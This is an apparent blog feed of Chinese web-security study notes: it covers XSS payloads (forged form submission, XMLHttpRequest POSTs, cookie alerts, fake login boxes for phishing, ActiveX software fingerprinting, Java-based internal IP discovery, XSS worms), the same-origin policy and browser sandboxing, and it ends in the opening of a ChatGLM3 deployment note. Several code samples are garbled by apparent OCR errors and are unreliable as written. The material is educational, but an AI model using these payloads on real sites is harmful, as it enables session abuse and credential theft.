class="string">&quot;form&quot;</span>);</span><br><span class="line">f.<span class="property">action</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">f.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;input&quot;</span>);</span><br><span class="line">i1.<span class="property">name</span> = <span class="string">&quot;ck&quot;</span>;</span><br><span class="line">i1.<span class="property">value</span> = <span class="string">&quot;JiUY&quot;</span>;</span><br><span class="line">f.<span class="title function_">appendchi1d</span>(i1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input”);</span></span><br><span class="line"><span class="string">i2.name = &quot;</span> mb_text<span class="string">&quot;;</span></span><br><span class="line"><span class="string">i2.value = &quot;</span>testtesttest<span class="string">&quot;;</span></span><br><span class="line"><span class="string">f.appendchild(i2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f.submit();</span></span><br></pre></td></tr></table></figure><blockquote><p>如果表单的参数很多的话，通过构造DOM 节点的方式，代码将会非常冗长。所以可以使用第二种方法，直接写HTML代码，这样会使得整个代码精简很多。</p></blockquote></li><li><p>b. 直接构造HTML代码，如下所示:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = doeument.<span class="property">createElement</span> (<span class="string">&quot;div&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendchild</span>(dd);</span><br><span class="line">dd.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;xssform&quot; name=&quot;mbform&quot;&gt; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type =<span class="string">&quot;hidden&quot;</span> value = <span class="string">&quot;JiUY&quot;</span> name=<span class="string">&quot;ck&quot;</span>/&gt;<span class="string">&#x27; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;testtesttest&quot;</span> name = <span class="string">&quot;mb_text”/&gt;&#x27; + </span></span><br><span class="line"><span class="string">&#x27;&lt;/form&gt;&#x27;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>xssform<span class="string">&quot;).submit();</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>2）通过 XMLHttpRequest 发送一个 POST 请求</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://www.douban.com&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">&quot;ck=JiUY &amp;mb text-test1234&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> ajax =nul1;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpReguest</span>)&#123;</span><br><span class="line">    ajax =<span class="keyword">new</span> <span class="title class_">XMLRttpRequest</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">Activexobject</span>)&#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> <span class="title class_">ActiveXobjeet</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.<span class="property">setRequestHeader</span> (<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>(postStr);</span><br><span class="line"></span><br><span class="line">ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.<span class="property">readystate</span>- <span class="number">4</span>&amp;&amp; ajax.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h1><p>XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”，当出现需要与用户进行交互的情况是，如：碰到验证码、修改密码时需要输入旧密码，XSS Payload就会失效。</p><p>但我们可以通过其他方法来进行攻击：</p><ul><li>验证码：XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施。攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</li><li>修改密码：攻击者可以将XSS与”钓鱼”结合。如：利用 Javascript 在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</li></ul><h1 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h1><p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。</p><p>如何通过JavaScript脚本识别浏览器版本呢？</p><ol><li><p><strong>通过XSS 读取浏览器的UserAgent对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);</span><br></pre></td></tr></table></figure><p>但是userAgent是可以伪造的，同时浏览器的一些拓展也可以屏蔽或自定义UA，这个信息不一定准确。</p></li><li><p><strong>根据浏览器之间的差异识别</strong></p><p>根据每种浏览器独有的对象特征识别浏览器的大版本</p></li></ol><h1 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h1><p>知道用户使用的浏览器、操作系统后，可以通过各种方法<strong>识别用户安装了的软件</strong></p><ol><li><p><strong>通过浏览器控件的classid检测相应软件</strong></p><p>可以通过判断软件对应控件的classid是否存在，来判断用户是否安装了该软件</p><p>如下代码检测迅雷的控件 <code>XunLeiBHO.ThunderIEHelper</code> ，如果存在，用户大概率也安装了迅雷软件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;XunLeiBHO.ThunderIEHelper&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">  <span class="comment">//异常了，不存在该控件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本</strong>。</p></li><li><p><strong>通过第三方软件</strong></p><p>如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript</p></li><li><p><strong>其他</strong></p><p>在Chrome中有一个特殊的协议: chrome:&#x2F;&#x2F; ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome://flashgot/skin/icon32.png</span><br></pre></td></tr></table></figure><p>扫描Chrome扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p></li></ol><h1 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h1><p>通过CSS，来<strong>发现用户曾经访问过的网站</strong></p><p>如果用户曾经访问过某个链接，那么这个链接的颜色会和未访问过的链接颜色不一致。</p><p>对应的POC代码见《白帽子讲web安全》P58</p><p>搜索引擎好像没有这个情况了，但是google scholar仍然存在，访问过的为紫色</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240229200958088.png" alt="image-20240229200958088"></p><h1 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h1><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢?</p><p>可以通过XSS Payload获取客户端的本地IP地址。</p><p><strong>javascript本身并没有获取本地IP地址的能力。</strong>一般需要第三方软件来完成。</p><p>比如，客户端安装了Java环境(JRE)，那么XSS就可以通过调用J ava Applet 的接口获取客户端的本地IP地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AttackAPI</span>.<span class="property">dom</span>.<span class="property">getInternalIP</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> sock = <span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">Socket</span>();</span><br><span class="line">      sock.<span class="title function_">bind</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">0</span>));</span><br><span class="line">      sock.<span class="title function_">connect</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="variable language_">document</span>.<span class="property">domain</span>,(!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>)?<span class="number">80</span>:<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>));</span><br><span class="line">      <span class="keyword">return</span> sock.<span class="title function_">getLocalAddress</span>().<span class="title function_">getHostAddress</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有两个通过API获取本地网络信息的API见《白帽子讲web安全》P61</p><h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><ol><li><p><strong>定义</strong></p><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，破坏力和影响力巨大。XSS蠕虫借助 Ajax技术实现对Web应用程序中存在的 XSS 漏洞进行自动化利用传播，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p></li><li><p><strong>应用场景与条件</strong></p><p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSSWorm攻击。比如，发送站内信、用户留言等页面，都是xss worm的高发区。</p><blockquote><p>如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p></blockquote></li><li><p><strong>例子</strong></p><ul><li><p><strong>第一个重量级的XSS worm —— Samy worm</strong></p><p>通过在标签的style属性上构造XSS蠕虫</p><p>解析：<a href="https://www.cnblogs.com/milantgh/p/3655070.html">https://www.cnblogs.com/milantgh/p/3655070.html</a></p></li><li><p>百度空间蠕虫</p><p>在CSS代码后插入js代码</p><p>解析：<a href="https://blog.csdn.net/qq_33605106/article/details/79756478">https://blog.csdn.net/qq_33605106/article/details/79756478</a></p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『XSS攻击』XSS简介</title>
      <link href="/posts/13a2.html"/>
      <url>/posts/13a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h1><p>XSS全称是Cross Site Scripting，中文为<strong>跨站脚本攻击</strong>，为了和CSS（层叠样式表（<code>Cascading Style Sheets，CSS</code>））区分命名为XSS。</p><p>XSS的原理：在HTML页面中注入恶意脚本，当目标网站目标用户的浏览器渲染HTML文档时，恶意脚本执行，使得黑客可以控制用户浏览器。</p><p>一个简单的例子：</p><p>有一个网页，会将用户输入的内容回显在页面上。</p><p>如果我们在该网页输入如下脚本，脚本的作用就是弹出一个对话框显示用户的Cookie信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果目标服务器没有对这个输入进行检验就直接将其显示在页面上的话，则会生成如下形式的页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这段脚本已经成功嵌入到该页面当中。</p><p>当受害浏览器访问这个页面的时候，这段脚本也将被认为是页面的一部分，从而<strong>被执行</strong>，即弹出对话框显示受害浏览器的Cookie信息。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>根据效果的不同，XSS攻击主要可以分为以下几类：</p><h2 id="反射型XSS（非持久型XSS）"><a href="#反射型XSS（非持久型XSS）" class="headerlink" title="反射型XSS（非持久型XSS）"></a>反射型XSS（非持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>一般情况下，黑客发送给别人发送<strong>带有恶意脚本代码参数的 <code>url</code></strong> ，当用户打开这个带有恶意代码参数的 <code>url</code> 地址时，恶意脚本代码作为输入提交到服务器端，服务器端解析后响应，恶意代码被目标服务器通过<strong>错误信息、搜索结果等等方式“反射”</strong>回显在用户的浏览器上，浏览器解析执行XSS代码。</p><blockquote><p>场景：一般会出现在查询类页面等。</p><p>这种网站一般会显示用户的输入，用户点开会恶意代码参数就会显示在网站上并执行。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>非持久性。攻击脚本不会写入网站的数据库，是一次性的攻击。所以黑客一般需要诱骗用户点击包含攻击脚本的 URL，才能攻击成功。</li><li>需要传递给服务器，通过服务器反射恶意脚本</li></ul></li><li><p><strong>例子</strong></p><p>假设网站有一个搜索功能，该功能接收URL参数中用户提供的搜索词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=gift</span><br></pre></td></tr></table></figure><p>网站在对这个URL的响应中，回显用户提供的搜索词</p><p>假设应用程序不对数据进行任何其他处理，攻击者就可以构造如下的url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他用户访问这个url的时候，对应渲染出来的html应该为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户的浏览器就会执行script内部的恶意代码</p></li></ol><h2 id="存储型XSS（持久型XSS）"><a href="#存储型XSS（持久型XSS）" class="headerlink" title="存储型XSS（持久型XSS）"></a>存储型XSS（持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>黑客利用XSS 漏洞，将内容经正常功能提交进入目标服务器端的数据库中并持久保存。当正常用户请求目标页面时，前端页面获得后端从数据库中读出的注入代码，恰好将其渲染执行。</p><blockquote><p>场景：一般存在于 Form 表单提交等交互功能，如发帖留言，注册页面等。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>稳定性：恶意脚本存入网站服务器端</li></ul></li><li><p><strong>例子</strong></p><p>黑客写下一篇包含有恶意JavaScript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。</p></li></ol><h2 id="DOM-based型XSS"><a href="#DOM-based型XSS" class="headerlink" title="DOM-based型XSS"></a>DOM-based型XSS</h2><ol><li><p><strong>原理</strong></p><p>从效果来看，DOM-based型XSS也属于反射型，但是其形成的原因比较特殊，所以单独拿出来介绍。</p><p><strong>通过DOM操作前端代码输出</strong>的时候形成的XSS为DOM-based型XSS</p><p>客户端的脚本<strong>通过DOM动态地输出数据到页面</strong>而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行。</p><blockquote><p>场景：一般产生于用户能够进行参数输入查询的地方</p><p><strong>网站本地执行url中的参数而并不传给服务器</strong></p></blockquote></li><li><p><strong>特点</strong></p><ul><li>不与后台服务器产生数据交互</li><li>无法从服务器端进行防御。因为构造的url中的恶意代码参数并不传给服务器，而是客户端获得DOM中的数据直接在本地执行，服务器无法检测到。</li><li>通过客户端脚本在浏览器端触发</li></ul></li><li><p><strong>例子</strong></p><p>有一个网站，包含一个搜索框，用户输入关键字并点击搜索按钮，搜索结果会显示在页面上。网站使用JavaScript来获取URL中的搜索词并将其显示在页面上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/1637811827_619f06737e8996f4cbccd.png" alt="img"></p><p>可以看到网站直接通过document.write从url中提取参数并将参数打印在网页上，而并没有将参数传给服务器</p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用户访问该url时直接本地执行xss代码</p></li></ol><h1 id="XSS攻击学习平台"><a href="#XSS攻击学习平台" class="headerlink" title="XSS攻击学习平台"></a>XSS攻击学习平台</h1><ul><li>Attack API</li><li>BeEF</li><li>XSS-Proxy</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『浏览器安全』浏览器同源策略与沙箱</title>
      <link href="/posts/77ff.html"/>
      <url>/posts/77ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="同源策略的定义"><a href="#同源策略的定义" class="headerlink" title="同源策略的定义"></a>同源策略的定义</h2><p>我们的浏览器出于安全考虑，只允许与<strong>本域</strong>下的接口交互。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</p><h2 id="同源策略的应用"><a href="#同源策略的应用" class="headerlink" title="同源策略的应用"></a>同源策略的应用</h2><p>如果没有同源策略，别人就可以轻松的获取我们网站的 cookie 信息， 或是对网页进行DOM操作，可能会造成数据被盗取等后果。</p><p>例如，它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，从第三方网络邮件服务（用户已登录）或公司内网（因没有公共 IP 地址而受到保护，不会被攻击者直接访问）读取数据，并将这些数据转发给攻击者</p><h2 id="本域与跨域"><a href="#本域与跨域" class="headerlink" title="本域与跨域"></a>本域与跨域</h2><p>在<strong>同一个协议、主机、端口</strong>下的页面属于同一个域（即本域），否则就是跨域。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240125204517169.png" alt="image-20240125204517169"></p><blockquote><p>同主机：表示的是主机名相同，而并不是域名。比如上面的例子，第一个例子的主机名为 <code>store.company.com</code> ，最后一个例子的主机名为 <code>news.company.com</code> ，两个例子的主机名不相同，但是域名均为 <code>company.com</code> ，不同源</p></blockquote><p>如果是以下两个链接进行数据交互，可以通过同源策略的检测，允许交互：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.angular.cn:80/guide/inputs-outputs</span><br><span class="line">https://www.angular.cn:80/guide/index</span><br></pre></td></tr></table></figure><p>而如果是以下这样的链接交互数据，则不能通过同源策略的检测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.child.a.com/test/index.html ----失败，域名不同</span><br><span class="line">https://www.a.com/test/index.html ----失败，协议不同</span><br><span class="line">http://www.a.com:8080/test/index.html ----失败，端口号不同</span><br></pre></td></tr></table></figure><p>所以就会牵引出一个问题，<strong>不同源的数据如何进行交互？</strong></p><h2 id="跨域数据交互问题"><a href="#跨域数据交互问题" class="headerlink" title="跨域数据交互问题"></a>跨域数据交互问题</h2><p>如何跨域加载资源？</p><ol><li><p><strong>一些特殊的标签</strong></p><p><code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签可以跨域加载资源</p><p>如：可以通过下面的代码访问其他域下的脚本文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过jsonp来实现跨域请求</strong></p></li><li><p><strong>通过CORS（跨域资源共享）实现跨域请求</strong></p></li><li><p><strong>通过代理实现跨域请求</strong><br>我们都知道同源策略是浏览器自带的，那么我们如果要避免同源策略进行跨域请求，我们可以通过代理服务器的方式进行请求，例如我们请求一个与自身不同域的脚本文件，那么我们可以<strong>先请求与自身同域的一个 url ，然后通过代理服务器进行跳转， 最后返回由代理服务器请求到的脚本文件</strong></p></li></ol><blockquote><p>详细的例子归纳见：<a href="https://blog.csdn.net/l_ppp/article/details/106402136">https://blog.csdn.net/l_ppp/article/details/106402136</a></p></blockquote><h2 id="浏览器第三方插件的同源策略"><a href="#浏览器第三方插件的同源策略" class="headerlink" title="浏览器第三方插件的同源策略"></a>浏览器第三方插件的同源策略</h2><p>对于浏览器来说，浏览器加载的一些第三方插件也有各自的同源策略。</p><p>最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p><h1 id="浏览器沙箱（sandbox）"><a href="#浏览器沙箱（sandbox）" class="headerlink" title="浏览器沙箱（sandbox）"></a>浏览器沙箱（sandbox）</h1><p>以chrome浏览器为例，采用了<strong>多进程架构</strong>，主要进程包括：浏览器进程、渲染进程、插件进程和拓展进程。插件进程如flash、java、pdf 等与浏览器进程严格隔离，因此不会互相影响。</p><p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程或操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p><p>Sandbox（沙箱）：</p><ul><li><p>原理：Sandbox 的设计目的是为了<strong>让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。</strong>如果<strong>一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性</strong>。</p></li><li><p>应用实例：比如一个提供 hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个 Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p></li></ul><p>浏览器所加载的一些第三方插件往往不收sandbox管辖，近年来大部分的浏览器漏洞都是<strong>加载第三方插件</strong>导致的。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/zhengna/p/11428822.html">https://www.cnblogs.com/zhengna/p/11428822.html</a></li><li><a href="https://blog.csdn.net/t0410ch/article/details/125150202">https://blog.csdn.net/t0410ch/article/details/125150202</a></li><li><a href="https://blog.csdn.net/u012861467/article/details/79530629">https://blog.csdn.net/u012861467/article/details/79530629</a></li><li><a href="https://cloud.tencent.com/developer/article/1878652">https://cloud.tencent.com/developer/article/1878652</a></li><li><a href="https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html">https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/348948397">https://zhuanlan.zhihu.com/p/348948397</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『大模型』本地部署chatglm3-6b</title>
      <link href="/posts/d5ac.html"/>
      <url>/posts/d5ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>ChatGLM3-6B发布于2023年10月27日，是目前中文能力排名最高的开源LLM模型。对应项目的github地址：<a href="https://github.com/THUDM/ChatGLM3">https://github.com/THUDM/ChatGLM3</a></p><p>实验室项目中需要本地部署大模型用于新闻文本摘要任务，因为预测速度的要求及硬件条件的限制，比较后选择该模型的6B版本。</p><p>本文为在linux环境下的chatglm3-6b的本地部署工程记录。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="CUDA与CUDNN"><a href="#CUDA与CUDNN" class="headerlink" title="CUDA与CUDNN"></a>CUDA与CUDNN</h2><p>深度学习任务中，当使用GPU进行训练的时候，需要安装英伟达提供的驱动和显卡对应的cuda、cudnn。</p><h3 id="什么是cuda和cudnn？"><a href="#什么是cuda和cudnn？" class="headerlink" title="什么是cuda和cudnn？"></a>什么是cuda和cudnn？</h3><ul><li>CUDA(ComputeUnified Device Architecture)：是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。</li><li>CUDNN：是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、torch</li></ul><p>需要注意的是，cuda、cudnn和我们常用的深度学习框架（如tensorflow-gpu、torch-gpu）之间的版本存在对应关系，如果配置错误则代码不能运行。</p><p>我们首先查看服务器上的显卡相关信息，在命令行输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span 